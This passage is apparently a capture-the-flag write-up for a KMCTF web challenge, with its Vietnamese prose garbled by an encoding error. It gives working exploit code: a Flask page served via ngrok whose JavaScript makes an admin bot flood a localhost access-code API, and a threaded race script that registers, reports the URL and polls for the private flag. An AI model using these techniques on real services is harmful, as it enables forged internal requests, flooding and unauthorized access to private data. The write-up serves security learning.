    - Khi bot má»Ÿ link cá»§a mÃ¬nh, trong Ä‘Ã³ cÃ³ Javascript spam request tá»›i `http://127.0.0.1:19101/api/post/1/access-code`
    - Má»—i request táº¡o 1 access code má»›i (má»¥c tiÃªu lÃ  server bá»‹ ngháº½n vÃ  cháº¥p nháº­n táº¡o ra 1 access code máº·c Ä‘á»‹nh lÃ  1337)
    - VÃ¬ request xuáº¥t phÃ¡t tá»« localhost nÃªn server tin cáº­y vÃ  cháº¥p nháº­n táº¡o access-code cho post ID = 1 

4. Thá»±c thi 
- Táº¡o 1 webhook server (flask) tráº£ vá» HTML/JS, trong Ä‘Ã³ cÃ³ vÃ²ng láº·p gá»­i 5000 request tá»›i API `/api/post/1/access-code`
- Gá»­i URL webhook nÃ y cho bot thÃ´ng qua `/api/report`
- Bot sáº½ load trang, thá»±c thi JS, vÃ  spam request táº¡o access code cho Post ID = 1, attacker chá»‰ viá»‡c truy cáº­p `/post/1?code=1337`

5. Láº¥y Flag 
- á»ž phÃ­a attacker 
    - ÄÄƒng kÃ½ vÃ  login má»™t tÃ i khoáº£n bÃ¬nh thÆ°á»ng 
    - Gá»­i report tá»›i bot vá»›i URL webhook 
    - Äá»“ng thá»i script local liÃªn tá»¥c gá»­i request tá»›i `GET /post/1?code=1337`
- Sau khi bot Ä‘Ã£ táº¡o dÃ¹m access code `1337` cho Post ID = 1, attacker chá»‰ cáº§n truy cáº­p `/post/1/?code=1337`
- VÃ¬ access code há»£p lá»‡, post private Ä‘Æ°á»£c hiá»ƒn thá»‹ -> lá»™ flag 

### Khai thÃ¡c 

#### File `webhook.py`

```Python= 
from flask import Flask, request, make_response 
from flask_cors import CORS 

app = Flask(__name__)
CORS(app)

HTML_RESPONSE = """
<!DOCTYPE html> 
<html>
<head>
    <title>Webhook Received</title>
</head>
<body>
    <h1>Webhook Received</h1>
    <script>
        for (let i = 1; i < 5000; i++) {
            fetch ("http://127.0.0.1:19101/api/post/1/access-code", {
                method: "POST",
                body: JSON.stringify({
                    valid_hours: 24, 
                    username: "hoangphuc",
                    custom_code: "0123456789"
                }),
                credentials: "include"
            })
        }
    </script>
</body>
</html>
"""

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def webhook(path):
    print(f"âœ… Received {request.method} request on /{path}")
    response = make_response(HTML_RESPONSE, 200)
    response.headers['Content-Type'] = 'text/html'
    return response 

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

File `webhook.py` nÃ y sáº½ thá»±c hiá»‡n báº±ng cÃ¡ch khi bot nháº¥p vÃ o thÃ¬ sáº½ fetch tá»›i endpoint táº¡o access-code 5000 láº§n. 

MÃ¬nh sáº½ cháº¡y file nÃ y vÃ  public nÃ³ qua ngrok. 

![image](https://hackmd.io/_uploads/Sy-5ixd5xg.png)

![image](https://hackmd.io/_uploads/ryP2jlO9lx.png)

#### File `script.py`

```python=
import requests 
import threading 
import time 
import os 
import urllib.parse 
from bs4 import BeautifulSoup
import re 

BASE_URL = "http://localhost:19101"
NUM_GET_REQUESTS = 5000 
FLAG_REGEX = r"KMCTF\{[^\}]+\}"
TEST_USERNAME = "hoangphuc"
TEST_PASSWORD = "hoangphuc"
REGISTER_URL = f"{BASE_URL}/register"
LOGIN_URL = f"{BASE_URL}/login"
REPORT_POST_URL = f"{BASE_URL}/api/report?url=http%3A%2F%2F0.tcp.ap.ngrok.io%3A11165"
ACCESS_GET_URL = f"{BASE_URL}/post/1?code=1337"

stop_event = threading.Event() 

def find_and_print_flag(response_text):
    soup = BeautifulSoup(response_text, 'html.parser')
    post_content_divs = soup.find_all('div', class_='post-content')
    for div in post_content_divs:
        content_text = div.get_text()
        match = re.search(FLAG_REGEX, content_text)
        flag = match.group(0)
        print(f"ðŸŽ‰ Found flag: {flag}")
        stop_event.set()
        os._exit(0)
        
def register_user(session, username, password):
    data = {
        "username": username,
        "password": password
    }
    session.post(REGISTER_URL, data=data, headers={"Referer": f"{BASE_URL}/register"})
    
def login_user(session, username, password):
    data = {
        "username": username,
        "password": password
    }
    session.post(LOGIN_URL, data=data, headers={"Referer": LOGIN_URL}, allow_redirects=True)
    
def send_report_post_request(session, csrf_token_header_value):
    if stop_event.is_set():
        return 
    X_CSRF_Token_header = {"X-CSRF-Token": csrf_token_header_value}
    session.post(REPORT_POST_URL, headers=X_CSRF_Token_header)
    
def send_access_get_request(session, request_id):
    if stop_event.is_set():
        return 
    response = session.get(ACCESS_GET_URL)
    if response.status_code == 200:
        find_and_print_flag(response.text) 

if __name__ == "__main__":
    print("ðŸ”„ Starting script...")
    s = requests.Session()
    register_user(s, TEST_USERNAME, TEST_PASSWORD)
    login_user(s, TEST_USERNAME, TEST_PASSWORD)
    csrf_token_cookie_value = s.cookies.get("csrf_token")
    print(f"ðŸ”‘ CSRF token (cookie): {csrf_token_cookie_value}")
    csrf_token_for_header = urllib.parse.quote(str(csrf_token_cookie_value))
    print(f"ðŸ”‘ CSRF token (header): {csrf_token_for_header}")
    post_thread = threading.Thread(target=send_report_post_request, args=(s, csrf_token_for_header))
    get_threads = []
    for i in range(NUM_GET_REQUESTS):
        thread = threading.Thread(target=send_access_get_request, args=(s, i + 1))
        get_threads.append(thread)    
    
    all_threads = [post_thread] + get_threads 
    
    for thread_idx, thread_obj in enumerate(all_threads):
        if stop_event.is_set():
            break 
        thread_obj.start()
    
    for thread_obj in all_threads:
        if thread_obj.is_alive():
            thread_obj.join()
``` 

Ã½ nghÄ©a cá»§a script nÃ y:
- register
- login 
- sau Ä‘Ã³, cháº¡y cÃ¡c thread vá»›i nhau bao gá»“m 1 thread tá»›i post report vÃ  5000 thread cÃ²n láº¡i tá»›i `/post/1?code=1337`

![image](https://hackmd.io/_uploads/H1iTnZu5lx.png)










